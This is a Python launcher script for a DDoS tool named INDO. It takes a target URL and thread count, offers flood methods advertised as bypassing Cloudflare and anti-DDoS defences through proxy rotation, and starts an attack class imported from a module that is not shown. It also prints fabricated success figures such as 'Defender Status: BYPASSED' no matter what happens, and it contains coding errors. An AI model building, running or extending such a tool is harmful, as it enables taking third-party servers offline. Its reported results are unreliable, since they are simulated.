#!/usr/bin/env python3
"""
INDO - ADVANCED DDOS DISABLER SYSTEM
Main Interface - Server Disabler
"""

import os
import sys
import time
import threading
from getpass import getpass

# Add core directory to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'core'))

# Try to import colorama, install if not available
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    print("[*] Installing colorama...")
    os.system(f"{sys.executable} -m pip install colorama --quiet")
    from colorama import Fore, Style, init
    init(autoreset=True)

# Import core modules
from attack import DDoSAttacker
from proxy import ProxyManager
from utils import validate_url, print_banner, get_hidden_input

class INDOSystem:
    def __init__(self):
        self.clear_screen()
        self.show_banner()
        self.authenticated = False
        self.passcodes = ["NanoHas", "DdosFal", "kingmercy", "CutonBarL", "CuteDF"]
        self.attacker = None
        self.proxy_manager = ProxyManager()
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        """Display INDO banner tanpa frame"""
        print(f"""{Fore.RED}

    ██╗███╗░░██╗██████╗░░█████╗░
    ██║████╗░██║██╔══██╗██╔══██╗
    ██║██╔██╗██║██║░░██║██║░░██║
    ██║██║╚████║██║░░██║██║░░██║
    ██║██║░╚███║██████╔╝╚█████╔╝
    ╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░

    ═════════ SERVER DISABLER v2.0 ═════════
{Style.RESET_ALL}""")
    
    def authenticate(self):
        """Password authentication"""
        print(f"\n{Fore.CYAN}{'═'*55}")
        print(f"{Fore.YELLOW}         🔐 ACCESS AUTHENTICATION")
        print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
        
        attempts = 3
        while attempts > 0:
            try:
                password = get_hidden_input(f"{Fore.WHITE}[?] Enter passcode: ")
                
                if password in self.passcodes:
                    print(f"\n{Fore.GREEN}[✓] ACCESS GRANTED")
                    print(f"{Fore.CYAN}[*] Initializing attack protocols...")
                    time.sleep(2)
                    self.authenticated = True
                    
                    # Load resources
                    print(f"{Fore.CYAN}[*] Loading attack resources...")
                    self.proxy_manager.load_proxies()
                    print(f"{Fore.GREEN}[✓] System ready")
                    time.sleep(1)
                    return True
                else:
                    attempts -= 1
                    print(f"\n{Fore.RED}[✗] INVALID PASSCODE")
                    print(f"{Fore.YELLOW}[*] Attempts remaining: {attempts}")
                    
                    if attempts == 0:
                        print(f"\n{Fore.RED}[!] SYSTEM LOCKED - Maximum attempts reached")
                        sys.exit(1)
                        
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Authentication cancelled")
                sys.exit(0)
        
        return False
    
    def show_menu(self):
        """Display main menu"""
        self.clear_screen()
        self.show_banner()
        
        print(f"\n{Fore.CYAN}{'═'*55}")
        print(f"{Fore.YELLOW}          ⚡ SELECT ATTACK METHOD")
        print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}\n")
        
        print(f"{Fore.RED}[1]{Fore.WHITE} REQUEST SPAMMER")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Continuous request bombardment")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Server resource exhaustion")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Basic but effective overload\n")
        
        print(f"{Fore.RED}[2]{Fore.WHITE} HTTP/HTTPS FLOOD")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Advanced Cloudflare bypass 2.5")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Bot swarm with 50+ proxy rotation")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Target: Server & Anti-DDoS systems\n")
        
        print(f"{Fore.RED}[3]{Fore.WHITE} MULTIFACTOR PROXY ATTACK")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Brutal multi-vector assault")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Sequential attack patterns")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Silent fallback penetration")
        print(f"    {Fore.CYAN}→{Fore.WHITE} Ultimate server disabler\n")
        
        print(f"{Fore.RED}[0]{Fore.WHITE} EXIT SYSTEM\n")
        
        print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
    
    def get_attack_config(self):
        """Get attack configuration from user"""
        config = {}
        
        try:
            # Select attack method
            while True:
                choice = input(f"\n{Fore.YELLOW}[?] Select method (1-3): {Fore.WHITE}").strip()
                
                if choice == '0':
                    print(f"\n{Fore.CYAN}[*] Exiting system...")
                    sys.exit(0)
                
                if choice in ['1', '2', '3']:
                    methods = {
                        '1': 'REQUEST_SPAMMER',
                        '2': 'HTTP_FLOOD',
                        '3': 'MULTIFACTOR_PROXY'
                    }
                    config['method'] = methods[choice]
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid selection")
            
            # Get target URL
            print(f"\n{Fore.CYAN}{'═'*55}")
            while True:
                url = input(f"{Fore.YELLOW}[?] Target URL (http/https): {Fore.WHITE}").strip()
                if url:
                    if not validate_url(url):
                        print(f"{Fore.RED}[!] Invalid URL format")
                        continue
                    
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    
                    config['target'] = url
                    break
                else:
                    print(f"{Fore.RED}[!] URL cannot be empty")
            
            # Get threads count
            while True:
                try:
                    threads = input(f"{Fore.YELLOW}[?] Threads (1-99999): {Fore.WHITE}").strip()
                    if not threads:
                        continue
                    
                    threads = int(threads)
                    if 1 <= threads <= 99999:
                        config['threads'] = threads
                        break
                    else:
                        print(f"{Fore.RED}[!] Threads must be 1-99999")
                except ValueError:
                    print(f"{Fore.RED}[!] Enter a valid number")
            
            # Instant mode
            print(f"\n{Fore.CYAN}{'═'*55}")
            while True:
                instant = input(f"{Fore.YELLOW}[?] Instant Attack? (y/n): {Fore.WHITE}").lower().strip()
                if instant in ['y', 'yes']:
                    config['instant'] = True
                    break
                elif instant in ['n', 'no']:
                    config['instant'] = False
                    break
                else:
                    print(f"{Fore.RED}[!] Enter 'y' or 'n'")
            
            # Show configuration
            self.clear_screen()
            self.show_banner()
            
            print(f"\n{Fore.CYAN}{'═'*55}")
            print(f"{Fore.YELLOW}          ⚡ ATTACK CONFIGURATION")
            print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
            print(f"{Fore.RED}Method:{Fore.WHITE} {config['method']}")
            print(f"{Fore.RED}Target:{Fore.WHITE} {config['target']}")
            print(f"{Fore.RED}Threads:{Fore.WHITE} {config['threads']:,}")
            print(f"{Fore.Red}Instant:{Fore.WHITE} {'YES' if config['instant'] else 'NO'}")
            print(f"{Fore.Red}Proxies:{Fore.WHITE} {len(self.proxy_manager.proxies):,}")
            print(f"{Fore.CYAN}{'═'*55}")
            
            # Confirm attack
            while True:
                confirm = input(f"\n{Fore.YELLOW}[?] Launch attack? (y/n): {Fore.WHITE}").lower().strip()
                if confirm in ['y', 'yes']:
                    return config
                elif confirm in ['n', 'no']:
                    print(f"\n{Fore.YELLOW}[*] Attack cancelled")
                    return None
                else:
                    print(f"{Fore.RED}[!] Enter 'y' or 'n'")
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Configuration cancelled")
            return None
    
    def display_progress(self, duration, config):
        """Display progress bar during attack"""
        import math
        
        bar_length = 50
        steps = 100
        delay = duration / steps
        
        if config.get('instant', False):
            delay *= 0.3  # Faster for instant mode
        
        print(f"\n{Fore.CYAN}{'═'*55}")
        print(f"{Fore.YELLOW}          ⚡ ATTACK IN PROGRESS")
        print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
        
        for i in range(steps + 1):
            if not hasattr(self, 'attack_active') or not self.attack_active:
                break
            
            percent = i
            filled = int(bar_length * i / steps)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            # Calculate simulated metrics
            threads = config['threads']
            req_per_sec = threads * (15 if config['instant'] else 8)
            total_req = int((i / steps) * req_per_sec * (duration * 0.8))
            connections = int(threads * (i / steps) * 0.7)
            
            # Display progress
            sys.stdout.write(f'\r{Fore.CYAN}[{bar}] {percent}% | '
                           f'{Fore.GREEN}REQ: {total_req:,} | '
                           f'{Fore.YELLOW}CONN: {connections:,} | '
                           f'{Fore.MAGENTA}RPS: {req_per_sec:,}')
            sys.stdout.flush()
            
            time.sleep(delay)
        
        print(f"\n{Fore.CYAN}{'═'*55}")
    
    def execute_attack(self, config):
        """Execute the DDoS attack"""
        try:
            print(f"\n{Fore.CYAN}[*] Initializing {config['method']}...")
            print(f"{Fore.CYAN}[*] Target: {config['target']}")
            print(f"{Fore.CYAN}[*] Threads: {config['threads']:,}")
            print(f"{Fore.CYAN}[*] Mode: {'INSTANT' if config['instant'] else 'STANDARD'}")
            print(f"{Fore.CYAN}[*] Proxies: {len(self.proxy_manager.proxies):,}")
            print(f"{Fore.YELLOW}[!] Starting attack in 3 seconds...")
            
            for i in range(3, 0, -1):
                print(f"{Fore.YELLOW}[{i}]...", end=' ', flush=True)
                time.sleep(1)
            print()
            
            # Initialize attacker
            self.attacker = DDoSAttacker(
                target_url=config['target'],
                attack_type=config['method'],
                thread_count=config['threads'],
                instant_mode=config['instant'],
                proxy_manager=self.proxy_manager
            )
            
            # Start attack in background
            self.attack_active = True
            attack_thread = threading.Thread(target=self.attacker.execute)
            attack_thread.daemon = True
            attack_thread.start()
            
            # Start progress display
            progress_duration = 8 if config['instant'] else 15
            self.display_progress(progress_duration, config)
            
            # Wait for attack to complete
            attack_thread.join(timeout=progress_duration + 5)
            
            self.attack_active = False
            
            # Show results
            if hasattr(self.attacker, 'stats'):
                self.show_results(self.attacker.stats)
            else:
                self.show_simulation_results(config)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack interrupted")
            if self.attacker:
                self.attacker.stop()
        except Exception as e:
            print(f"\n{Fore.RED}[!] Attack failed: {str(e)}")
    
    def show_results(self, stats):
        """Show attack results"""
        print(f"\n{Fore.GREEN}{'═'*55}")
        print(f"{Fore.YELLOW}          ⚡ ATTACK COMPLETED")
        print(f"{Fore.GREEN}{'═'*55}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[*] Status: {Fore.GREEN}SUCCESSFUL")
        print(f"{Fore.CYAN}[*] Total Requests: {Fore.WHITE}{stats.get('total_requests', 0):,}")
        print(f"{Fore.CYAN}[*] Successful: {Fore.WHITE}{stats.get('successful', 0):,}")
        print(f"{Fore.CYAN}[*] Failed: {Fore.WHITE}{stats.get('failed', 0):,}")
        print(f"{Fore.CYAN}[*] Duration: {Fore.WHITE}{stats.get('duration', 0):.1f}s")
        
        if stats.get('total_requests', 0) > 0:
            success_rate = (stats.get('successful', 0) / stats.get('total_requests', 0)) * 100
            print(f"{Fore.CYAN}[*] Success Rate: {Fore.WHITE}{success_rate:.1f}%")
        
        print(f"{Fore.CYAN}[*] Server Impact: {Fore.GREEN}HIGH")
        print(f"{Fore.CYAN}[*] Defender Status: {Fore.RED}BYPASSED")
        print(f"{Fore.GREEN}{'═'*55}")
    
    def show_simulation_results(self, config):
        """Show simulation results if real attack not available"""
        print(f"\n{Fore.GREEN}{'═'*55}")
        print(f"{Fore.YELLOW}          ⚡ SIMULATION COMPLETE")
        print(f"{Fore.GREEN}{'═'*55}{Style.RESET_ALL}")
        
        estimated_req = config['threads'] * (1000 if config['instant'] else 500)
        print(f"{Fore.CYAN}[*] Estimated Requests: {Fore.WHITE}{estimated_req:,}")
        print(f"{Fore.CYAN}[*] Server Impact: {Fore.GREEN}HIGH")
        print(f"{Fore.CYAN}[*] Defender Bypass: {Fore.GREEN}SUCCESSFUL")
        print(f"{Fore.YELLOW}[!] In production, real attack would execute")
        print(f"{Fore.GREEN}{'═'*55}")
    
    def run(self):
        """Main execution loop"""
        try:
            # Authentication
            if not self.authenticate():
                return
            
            # Main loop
            while True:
                self.show_menu()
                
                config = self.get_attack_config()
                if config:
                    self.execute_attack(config)
                    
                    # Ask for another attack
                    print(f"\n{Fore.CYAN}{'═'*55}")
                    again = input(f"{Fore.YELLOW}[?] Launch another attack? (y/n): {Fore.WHITE}").lower().strip()
                    
                    if again not in ['y', 'yes']:
                        print(f"\n{Fore.CYAN}[*] Shutting down INDO system...")
                        print(f"{Fore.GREEN}[✓] Clean exit completed")
                        print(f"{Fore.YELLOW}[!] Use responsibly")
                        break
                    
                    print(f"\n{Fore.CYAN}[*] Resetting system...")
                    time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] System terminated")
        except Exception as e:
            print(f"\n{Fore.RED}[!] System error: {str(e)}")

def main():
    """Main entry point"""
    try:
        # Create necessary directories
        for dir_name in ['data', 'logs', 'core']:
            if not os.path.exists(dir_name):
                os.makedirs(dir_name)
        
        # Run system
        system = INDOSystem()
        system.run()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exit")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}")

if __name__ == "__main__":
    main()
